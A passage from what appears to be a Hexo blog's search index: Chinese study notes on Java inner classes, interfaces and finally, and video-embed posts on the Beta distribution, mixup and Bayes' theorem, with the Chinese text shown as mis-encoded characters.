class="keyword">try</span>&#123;</span><br><span class="line">testTwo();</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="12-8-finally"><a href="#12-8-finally" class="headerlink" title="12.8 finally"></a>12.8 finally</h2><p><strong>é™¤äº†System.exit(1)ä»¥å¤–ï¼Œå…¶ä»–ä»»ä½•æƒ…å†µéƒ½ä¼šæ‰§è¡Œfinallyï¼Œç”šè‡³è·³è¿‡breakï¼Œcontinueï¼Œreturnç­‰è¯­å¥ã€‚</strong></p>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Betaåˆ†å¸ƒè¯¦è§£</title>
      <link href="/2021/06/14/Beta%E5%88%86%E5%B8%83_(4)/"/>
      <url>/2021/06/14/Beta%E5%88%86%E5%B8%83_(4)/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV1a54y1z7a8&cid=257887173&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe>]]></content>
      
      
      <categories>
          
          <category> MATH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
            <tag> math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®å¢å¹¿ï¼šmixupè¯¦è§£</title>
      <link href="/2021/06/14/mixup__BEYOND_EMPIRICAL_RISK_MINIMIZATION_(1)/"/>
      <url>/2021/06/14/mixup__BEYOND_EMPIRICAL_RISK_MINIMIZATION_(1)/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV14K4y1Y7S7&cid=226900007&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h1 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h1><ul><li>å¾—åˆ°æ›´å¤šæ•°æ®</li><li>å¯ä»¥å¢å¼ºgansçš„ç¨³å®šæ€§</li></ul><h1 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h1><p><img src="http://img04.sogoucdn.com/app/a/100540022/2021061518321982686462.png"><br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/175039/14/14586/39853/60c69d35Ef86ea14d/08573e5e1e1c8160.png"></p><h1 id="å˜ç§"><a href="#å˜ç§" class="headerlink" title="å˜ç§"></a>å˜ç§</h1><ul><li>Mixup manifold Mixup CutMix</li><li>AugMix</li><li>SuperMix</li><li>Puzzle Mix</li><li>Adaptive Mixup</li><li>Mixup+SemiSL-&gt;MixMatch</li><li>Mixup+Defense-&gt;Mixup Inference.</li></ul>]]></content>
      
      
      <categories>
          
          <category> PAPER </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
            <tag> paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¦‚ç‡å¯†åº¦å‡½æ•°(PDF)è¯¦è§£</title>
      <link href="/2021/06/14/%E6%A6%82%E7%8E%87%E5%AF%86%E5%BA%A6%E5%87%BD%E6%95%B0%EF%BC%88PDF%EF%BC%89%E8%AF%A6%E8%A7%A3/"/>
      <url>/2021/06/14/%E6%A6%82%E7%8E%87%E5%AF%86%E5%BA%A6%E5%87%BD%E6%95%B0%EF%BC%88PDF%EF%BC%89%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV1ga4y147sC&cid=180171176&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe>]]></content>
      
      
      <categories>
          
          <category> MATH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
            <tag> math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è´å¶æ–¯å®šç†,ä½¿æ¦‚ç‡è®ºç›´è§‰åŒ–</title>
      <link href="/2021/06/14/%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%AE%9A%E7%90%86%EF%BC%8C%E4%BD%BF%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9B%B4%E8%A7%89%E5%8C%96/"/>
      <url>/2021/06/14/%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%AE%9A%E7%90%86%EF%BC%8C%E4%BD%BF%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9B%B4%E8%A7%89%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV1R7411a76r&cid=145676762&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><a name="znVDE"></a># ç®€æ´è¯æ˜<iframe src="//player.bilibili.com/player.html?bvid=BV1o7411a76m&cid=145676706&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe>]]></content>
      
      
      <categories>
          
          <category> MATH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
            <tag> math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬10ç«  å†…éƒ¨ç±»</title>
      <link href="/2021/06/13/%E7%AC%AC10%E7%AB%A0_%E5%86%85%E9%83%A8%E7%B1%BB/"/>
      <url>/2021/06/13/%E7%AC%AC10%E7%AB%A0_%E5%86%85%E9%83%A8%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="å†…éƒ¨ç±»çš„å¥½å¤„ï¼š"><a href="#å†…éƒ¨ç±»çš„å¥½å¤„ï¼š" class="headerlink" title="å†…éƒ¨ç±»çš„å¥½å¤„ï¼š"></a>å†…éƒ¨ç±»çš„å¥½å¤„ï¼š</h2><ul><li><strong>å°†ç±»çš„ä»£ç éšè—åœ¨å…¶ä»–ç±»å†…éƒ¨ã€‚</strong></li><li><strong>å†…éƒ¨ç±»å¯¹è±¡å¯ä»¥è®¿é—®å¤–éƒ¨ç±»çš„æ‰€æœ‰å…ƒç´ </strong>Â <strong>ã€‚</strong></li><li><strong>è§£å†³å¤šç»§æ‰¿çš„é—®é¢˜ã€‚</strong></li><li><strong>å†…éƒ¨ç±»å¯ä»¥æœ‰å¤šä¸ªå®ä¾‹ï¼Œä¸å¤–éƒ¨ç±»ç‹¬ç«‹ã€‚</strong></li><li><strong>å•ä¸ªå¤–éƒ¨ç±»å¯ä»¥è®©å¤šä¸ªå†…éƒ¨ç±»å®ç°åŒä¸€ä¸ªæ¥å£æˆ–ç»§æ‰¿åŒä¸€ä¸ªç±»ã€‚</strong></li></ul><h2 id="ä¸€ã€æˆå‘˜å†…éƒ¨ç±»"><a href="#ä¸€ã€æˆå‘˜å†…éƒ¨ç±»" class="headerlink" title="ä¸€ã€æˆå‘˜å†…éƒ¨ç±»:"></a>ä¸€ã€æˆå‘˜å†…éƒ¨ç±»:</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è·å–å†…éƒ¨ç±»å¯¹è±¡å®ä¾‹çš„æ–¹å¼"><a href="#è·å–å†…éƒ¨ç±»å¯¹è±¡å®ä¾‹çš„æ–¹å¼" class="headerlink" title="è·å–å†…éƒ¨ç±»å¯¹è±¡å®ä¾‹çš„æ–¹å¼"></a>è·å–å†…éƒ¨ç±»å¯¹è±¡å®ä¾‹çš„æ–¹å¼</h3><ul><li><strong>æ™®é€šå†…éƒ¨ç±»å¯¹è±¡éšå¼çš„ä¿å­˜äº†ä¸€ä¸ªæŒ‡å‘å¤–éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨ã€‚</strong></li><li><strong>new å¤–éƒ¨ç±» . new å†…éƒ¨ç±»ã€‚</strong></li><li><strong>å¤–éƒ¨ç±»å¯¹è±¡ . new å†…éƒ¨ç±»ã€‚</strong></li><li><strong>å¤–éƒ¨ç±»å¯¹è±¡ . getæ–¹æ³•ã€‚</strong></li></ul><h3 id="10-3-ä½¿ç”¨-thiså’Œ-new"><a href="#10-3-ä½¿ç”¨-thiså’Œ-new" class="headerlink" title="10.3 ä½¿ç”¨.thiså’Œ.new"></a>10.3 ä½¿ç”¨.thiså’Œ.new</h3><ul><li><strong>å†…éƒ¨ç±»ä¸­è·å–å¤–éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨ï¼šå¤–éƒ¨ç±».this ã€‚</strong></li><li><strong>å¤–éƒ¨ç±»ä¸­è®¿é—®å†…éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨ï¼šnew å†…éƒ¨ç±»()ã€‚</strong></li><li><strong>å¤–éƒ¨ç±»ä¸­åˆ›å»ºå†…éƒ¨ç±»å¯¹è±¡å¿…é¡»ä½¿ç”¨å¤–éƒ¨ç±»å¯¹è±¡æ¥åˆ›å»ºå†…éƒ¨ç±»å¯¹è±¡ã€‚</strong><ul><li><strong><img src="https://img14.360buyimg.com/ddimg/jfs/t1/186931/40/8122/34987/60c75aa2Ec2f56c51/0e6a607f34a6dd50.jpg" alt="image.png"></strong></li></ul></li></ul><h3 id="10-4-å†…éƒ¨ç±»å’Œå‘ä¸Šè½¬å‹"><a href="#10-4-å†…éƒ¨ç±»å’Œå‘ä¸Šè½¬å‹" class="headerlink" title="10.4 å†…éƒ¨ç±»å’Œå‘ä¸Šè½¬å‹"></a>10.4 å†…éƒ¨ç±»å’Œå‘ä¸Šè½¬å‹</h3><p><strong>å†…éƒ¨ç±»ä¹Ÿå¯ä»¥å’Œæ™®é€šç±»ä¸€æ ·æ‹¥æœ‰å‘ä¸Šè½¬å‹çš„ç‰¹æ€§ã€‚å°†å†…éƒ¨ç±»å‘ä¸Šè½¬å‹ä¸ºåŸºç±»å‹ï¼Œå°¤å…¶æ˜¯æ¥å£æ—¶ï¼Œå†…éƒ¨ç±»å°±æœ‰äº†ç”¨æ­¦ä¹‹åœ°ã€‚å¦‚æœå†…éƒ¨ç±»æ˜¯privateçš„ï¼Œåªå¯ä»¥è¢«å®ƒçš„å¤–éƒ¨ç±»é—®ï¼Œä»è€Œå®Œå…¨éšè—å®ç°çš„ç»†èŠ‚ã€‚</strong></p><hr><h2 id="äºŒã€10-5-æ–¹æ³•å†…éƒ¨ç±»"><a href="#äºŒã€10-5-æ–¹æ³•å†…éƒ¨ç±»" class="headerlink" title="äºŒã€10.5 æ–¹æ³•å†…éƒ¨ç±»"></a>äºŒã€10.5 æ–¹æ³•å†…éƒ¨ç±»</h2><ul><li><p><strong>æ–¹æ³•ä¸­åˆ›å»ºç±»ã€‚</strong></p></li><li><p><strong>ç±»å‰ä¸èƒ½åŠ è®¿é—®è¯´æ˜ç¬¦ï¼Œç±»ä¸­ä¸èƒ½æœ‰é™æ€æˆå‘˜ã€‚</strong></p></li><li><p><strong>å¯ä»¥è®¿é—®ä»£ç å—å†…çš„å¸¸é‡å’Œå¤–éƒ¨ç±»çš„æ‰€æœ‰æˆå‘˜ã€‚</strong></p><h3 id="ä½¿ç”¨åœºæ™¯ï¼š"><a href="#ä½¿ç”¨åœºæ™¯ï¼š" class="headerlink" title="ä½¿ç”¨åœºæ™¯ï¼š"></a>ä½¿ç”¨åœºæ™¯ï¼š</h3></li><li><p><strong>å®ç°äº†æŸæ¥å£ï¼Œåˆ›å»ºå¹¶è¿”å›å¯¹å…¶çš„å¼•ç”¨ã€‚</strong></p></li><li><p><strong>éœ€è¦åˆ›å»ºä¸€ä¸ªç±»è¾…åŠ©è§£å†³é—®é¢˜ï¼Œä½†ä¸å¸Œæœ›è¿™ä¸ªç±»å…¬å…±å¯ç”¨ã€‚</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object getInner&#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="ä¸‰ã€10-6-åŒ¿åå†…éƒ¨ç±»"><a href="#ä¸‰ã€10-6-åŒ¿åå†…éƒ¨ç±»" class="headerlink" title="ä¸‰ã€10.6 åŒ¿åå†…éƒ¨ç±»"></a>ä¸‰ã€10.6 åŒ¿åå†…éƒ¨ç±»</h2><h3 id="ä½¿ç”¨åœºæ™¯ï¼š-1"><a href="#ä½¿ç”¨åœºæ™¯ï¼š-1" class="headerlink" title="ä½¿ç”¨åœºæ™¯ï¼š"></a>ä½¿ç”¨åœºæ™¯ï¼š</h3><ul><li><strong>åªç”¨åˆ°ç±»çš„ä¸€ä¸ªå®ä¾‹ï¼Œå› ä¸ºä¸ä¼šæœ‰å¯¹è±¡åç§°ï¼Œæ— æ³•å†æ¬¡è°ƒç”¨ã€‚</strong></li><li><strong>å®ä¾‹åŒ–çš„åŒæ—¶é‡å†™æ–¹æ³•ï¼Œç­‰åŒäºåˆ›å»ºå­ç±»ç»§æ‰¿çˆ¶ç±»å¹¶é‡å†™æ–¹æ³•æˆ–å®ç°æ¥å£ã€‚</strong></li><li><strong>æ²¡æœ‰é™æ€æˆå‘˜</strong><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test.getRead(<span class="keyword">new</span> Person()&#123; <span class="comment">//å®ä¾‹åŒ–çš„åŒæ—¶é‡å†™æ–¹æ³•ï¼Œç­‰åŒäºåˆ›å»ºå­ç±»ç»§æ‰¿çˆ¶ç±»å¹¶é‡å†™æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="å››ã€10-7-é™æ€å†…éƒ¨ç±»ï¼ˆåµŒå¥—ç±»ï¼‰"><a href="#å››ã€10-7-é™æ€å†…éƒ¨ç±»ï¼ˆåµŒå¥—ç±»ï¼‰" class="headerlink" title="å››ã€10.7 é™æ€å†…éƒ¨ç±»ï¼ˆåµŒå¥—ç±»ï¼‰"></a>å››ã€10.7 é™æ€å†…éƒ¨ç±»ï¼ˆåµŒå¥—ç±»ï¼‰</h2><h3 id="ä½¿ç”¨åœºæ™¯ï¼š-2"><a href="#ä½¿ç”¨åœºæ™¯ï¼š-2" class="headerlink" title="ä½¿ç”¨åœºæ™¯ï¼š"></a>ä½¿ç”¨åœºæ™¯ï¼š</h3><ul><li><p><strong>ä¸éœ€è¦å†…éƒ¨ç±»å¯¹è±¡ä¸å¤–éƒ¨ç±»æœ‰è”ç³»ã€‚</strong></p><h3 id="ä¸æ™®é€šå†…éƒ¨ç±»çš„åŒºåˆ«ï¼š"><a href="#ä¸æ™®é€šå†…éƒ¨ç±»çš„åŒºåˆ«ï¼š" class="headerlink" title="ä¸æ™®é€šå†…éƒ¨ç±»çš„åŒºåˆ«ï¼š"></a>ä¸æ™®é€šå†…éƒ¨ç±»çš„åŒºåˆ«ï¼š</h3></li><li><p><strong>æ™®é€šå†…éƒ¨ç±»å¯¹è±¡éšå¼çš„ä¿å­˜äº†ä¸€ä¸ªæŒ‡å‘å¤–éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨ï¼Œè€Œé™æ€å†…éƒ¨ç±»æ²¡æœ‰ã€‚</strong></p></li><li><p><strong>é™æ€å†…éƒ¨ç±»åˆ›å»ºå¯¹è±¡ä¸éœ€è¦å¤–éƒ¨ç±»å¯¹è±¡ã€‚</strong></p></li><li><p><strong>æ™®é€šå†…éƒ¨ç±»ä¸èƒ½æœ‰staticæˆå‘˜ï¼Œè€Œé™æ€å†…éƒ¨ç±»å¯ä»¥ã€‚</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>é™æ€å†…éƒ¨ç±»ä¸­ï¼Œä¸èƒ½é€šè¿‡å¯¹è±¡è®¿é—®éé™æ€çš„å¤–éƒ¨ç±»å¯¹è±¡ã€‚</strong></p></li><li><p><strong>åˆ›å»ºé™æ€å†…éƒ¨ç±»å¯¹è±¡ï¼šå¤–éƒ¨ç±».å†…éƒ¨ç±» ç±»å = new å¤–éƒ¨ç±».å†…éƒ¨ç±»();</strong></p></li></ul><h3 id="10-7-1-æ¥å£å†…éƒ¨å¯ä»¥æ”¾é™æ€å†…éƒ¨ç±»"><a href="#10-7-1-æ¥å£å†…éƒ¨å¯ä»¥æ”¾é™æ€å†…éƒ¨ç±»" class="headerlink" title="10.7.1 æ¥å£å†…éƒ¨å¯ä»¥æ”¾é™æ€å†…éƒ¨ç±»"></a>10.7.1 æ¥å£å†…éƒ¨å¯ä»¥æ”¾é™æ€å†…éƒ¨ç±»</h3><p><strong>æ­£å¸¸æƒ…å†µæ¥å£å†…éƒ¨ä¸èƒ½æ”¾ä»£ç ï¼Œä½†æ˜¯é™æ€å†…éƒ¨ç±»å¯ä»¥æ”¾ï¼Œè‡ªåŠ¨çš„publicå’Œstaticã€‚</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">implements</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="10-9-å†…éƒ¨ç±»çš„ç»§æ‰¿"><a href="#10-9-å†…éƒ¨ç±»çš„ç»§æ‰¿" class="headerlink" title="10.9 å†…éƒ¨ç±»çš„ç»§æ‰¿"></a>10.9 å†…éƒ¨ç±»çš„ç»§æ‰¿</h3><p><strong>å†…éƒ¨ç±»å¯¹è±¡éšå¼çš„åŒ…å«å¯¹å¤–éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨ï¼Œæ‰€ä»¥åœ¨ç»§æ‰¿å†…éƒ¨ç±»çš„åŒæ—¶ï¼Œæ„é€ å™¨éœ€è¦é€šè¿‡ç‰¹æ®Šè¯­æ³•åˆå§‹åŒ–è¿™ä¸ªå¼•ç”¨ã€‚</strong></p><ul><li><strong>å¤–éƒ¨ç±»å¯¹è±¡ . super()</strong><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">extends</span> <span class="title">Outer</span>,<span class="title">Inner</span></span>&#123;</span><br><span class="line">    <span class="comment">// A()&#123;&#125;ä¸èƒ½é€šè¿‡ç¼–è¯‘ã€‚ å¿…é¡»é€šè¿‡å¤–éƒ¨ç±»å¯¹è±¡.superåˆå§‹åŒ–å†…éƒ¨ç±»å¯¹è±¡å¯¹å¤–éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨ã€‚</span></span><br><span class="line">A(Outer o)&#123;</span><br><span class="line">    o.<span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬9ç«  æ¥å£</title>
      <link href="/2021/06/12/%E7%AC%AC9%E7%AB%A0_%E6%8E%A5%E5%8F%A3/"/>
      <url>/2021/06/12/%E7%AC%AC9%E7%AB%A0_%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="9-1-æŠ½è±¡ç±»å’ŒæŠ½è±¡æ–¹æ³•"><a href="#9-1-æŠ½è±¡ç±»å’ŒæŠ½è±¡æ–¹æ³•" class="headerlink" title="9.1 æŠ½è±¡ç±»å’ŒæŠ½è±¡æ–¹æ³•"></a>9.1 æŠ½è±¡ç±»å’ŒæŠ½è±¡æ–¹æ³•</h2><p><strong>å«æœ‰æŠ½è±¡æ–¹æ³•çš„ç±»å«åšæŠ½è±¡ç±»</strong>Â <strong>ã€‚</strong><br><strong><code>abstract class name&#123;...``&#125;</code></strong></p><h3 id="æŠ½è±¡æ–¹æ³•çš„ç‰¹å¾"><a href="#æŠ½è±¡æ–¹æ³•çš„ç‰¹å¾" class="headerlink" title="æŠ½è±¡æ–¹æ³•çš„ç‰¹å¾"></a>æŠ½è±¡æ–¹æ³•çš„ç‰¹å¾</h3><ul><li><strong>æŠ½è±¡æ–¹æ³•ä¸å…è®¸æœ‰æ–¹æ³•ä½“ï¼Œåªèƒ½ä»¥åˆ†å·â€œ;â€ç»“å°¾</strong>Â ã€‚</li><li><strong>æŠ½è±¡æ–¹æ³•åªèƒ½å£°æ˜åœ¨æŠ½è±¡ç±»ä¸­</strong> ã€‚</li><li><strong>æŠ½è±¡ç±»ä¸­å¯ä»¥åŒ…å«0ä¸ªæˆ–å¤šä¸ªæŠ½è±¡æ–¹æ³•ã€‚</strong></li><li><strong>æŠ½è±¡æ–¹æ³•å¿…é¡»è¢«å­ç±»å®ç°</strong>Â ã€‚</li><li><strong>å¦‚æœå­ç±»ä¸èƒ½å®ç°çˆ¶ç±»ä¸­çš„æŠ½è±¡æ–¹æ³•ï¼Œé‚£ä¹ˆå­ç±»ä¹Ÿå¿…é¡»æ˜¯æŠ½è±¡ç±»</strong>Â ã€‚<h3 id="ä»€ä¹ˆæƒ…å†µä¸‹ä½¿ç”¨æŠ½è±¡æ–¹æ³•å’ŒæŠ½è±¡ç±»"><a href="#ä»€ä¹ˆæƒ…å†µä¸‹ä½¿ç”¨æŠ½è±¡æ–¹æ³•å’ŒæŠ½è±¡ç±»" class="headerlink" title="ä»€ä¹ˆæƒ…å†µä¸‹ä½¿ç”¨æŠ½è±¡æ–¹æ³•å’ŒæŠ½è±¡ç±»"></a>ä»€ä¹ˆæƒ…å†µä¸‹ä½¿ç”¨æŠ½è±¡æ–¹æ³•å’ŒæŠ½è±¡ç±»</h3></li></ul><p><strong>çˆ¶ç±»çš„åç§°æ¯”è¾ƒæŠ½è±¡ï¼Œåˆ›å»ºå¯¹è±¡æ— æ„ä¹‰ã€‚</strong></p><h2 id="9-2-æ¥å£"><a href="#9-2-æ¥å£" class="headerlink" title="9.2 æ¥å£"></a>9.2 æ¥å£</h2><p><strong>æ¯”æŠ½è±¡ç±»æ›´æŠ½è±¡ã€‚</strong><br><strong><code>interface A&#123;...&#125;</code></strong><br><strong><code>class B implements A&#123;...&#125;</code></strong><br><strong>æ¥å£ä¸­çš„å˜é‡éšå¼çš„æŒ‡å®šä¸ºstaticå’Œfinal</strong>Â ï¼Œ <strong>æ²¡æœ‰æ–¹æ³•ä½“Â ã€‚</strong></p><h3 id="æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«"><a href="#æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«" class="headerlink" title="æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«"></a>æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«</h3><ul><li><strong>æŠ½è±¡ç±»åªèƒ½å•ç»§æ‰¿,æ¥å£èƒ½å¤šå®ç°</strong>Â ã€‚</li><li><strong>æŠ½è±¡ç±»æ˜¯ä¸€ä¸ªç±»,å¯ä»¥è¢«ä»»æ„æƒé™ä¿®é¥°ç¬¦ä¿®é¥°,é™æ€å’Œéé™æ€å±æ€§ï¼Œfinalå’Œéfinalå±æ€§ï¼Œå¯ä»¥æœ‰æŠ½è±¡æ–¹æ³•å’ŒéæŠ½è±¡æ–¹æ³•</strong></li><li><strong>æ¥å£åªèƒ½è¢«public,finalä¿®é¥°,åªèƒ½æœ‰é™æ€æ–¹æ³•,å³ä½¿æ²¡æœ‰æ˜¾ç¤ºçš„å£°æ˜ï¼Œè€Œä¸”æ˜¯ä¸å¯ä¿®æ”¹çš„ï¼›</strong></li><li><strong>æŠ½è±¡ç±»æ˜¯å¯¹ç±»çš„æŠ½è±¡ï¼Œæ¥å£æ˜¯å¯¹è¡Œä¸ºçš„æŠ½è±¡ã€‚</strong></li><li><strong>è®¾è®¡æŠ½è±¡ç±»æ˜¯è‡ªä¸‹è€Œä¸Šçš„è¿‡ç¨‹,æˆ‘å­ç±»éœ€è¦,æ‰€ä»¥æˆ‘å®šä¹‰æŠ½è±¡ç±»ï¼›è€Œè®¾è®¡æ¥å£æ˜¯è‡ªä¸Šè€Œä¸‹çš„è¿‡ç¨‹,æˆ‘æ¥å£è§„èŒƒæŸä¸€è¡Œä¸º,æˆ‘æŸç±»éœ€è¦è¿™ä¸ªè¡Œä¸º,æˆ‘å®ç°æŸæ¥å£ï¼›</strong></li></ul><p><strong>æ ¸å¿ƒåŒºåˆ«:</strong><br><strong>è°ƒç”¨è€…ä½¿ç”¨åŠ¨æœºä¸åŒ,å®ç°æ¥å£æ˜¯ä¸ºäº†ä½¿ç”¨ä»–è§„èŒƒçš„æŸä¸€ä¸ªè¡Œä¸ºï¼›</strong><br><strong>ç»§æ‰¿æŠ½è±¡ç±»æ˜¯ä¸ºäº†ä½¿ç”¨è¿™ä¸ªç±»å±æ€§å’Œè¡Œä¸º.</strong></p><p><strong>å†ç®€å•ç‚¹è¯´:</strong><br><strong>æˆ‘ä»¬çŸ¥é“æŠ½è±¡ç±»æ˜¯ä»å­ç±»ä¸­å‘ç°å…¬å…±éƒ¨åˆ†ï¼Œç„¶åæ³›åŒ–æˆæŠ½è±¡ç±»ï¼Œå­ç±»ç»§æ‰¿è¯¥çˆ¶ç±»å³å¯ï¼Œä½†æ˜¯æ¥å£ä¸åŒã€‚å®ç°å®ƒçš„å­ç±»å¯ä»¥ä¸å­˜åœ¨ä»»ä½•å…³ç³»ï¼Œå…±åŒä¹‹å¤„ã€‚ä¾‹å¦‚çŒ«ã€ç‹—å¯ä»¥æŠ½è±¡æˆä¸€ä¸ªåŠ¨ç‰©ç±»æŠ½è±¡ç±»ï¼Œå…·å¤‡å«çš„æ–¹æ³•ã€‚é¸Ÿã€é£æœºå¯ä»¥å®ç°é£Flyæ¥å£ï¼Œå…·å¤‡é£çš„è¡Œä¸ºï¼Œè¿™é‡Œæˆ‘ä»¬æ€»ä¸èƒ½å°†é¸Ÿã€é£æœºå…±ç”¨ä¸€ä¸ªçˆ¶ç±»å§ï¼æ‰€ä»¥è¯´æŠ½è±¡ç±»æ‰€ä½“ç°çš„æ˜¯ä¸€ç§ç»§æ‰¿å…³ç³»ï¼Œè¦æƒ³ä½¿å¾—ç»§æ‰¿å…³ç³»åˆç†ï¼Œçˆ¶ç±»å’Œæ´¾ç”Ÿç±»ä¹‹é—´å¿…é¡»å­˜åœ¨â€is-aâ€ 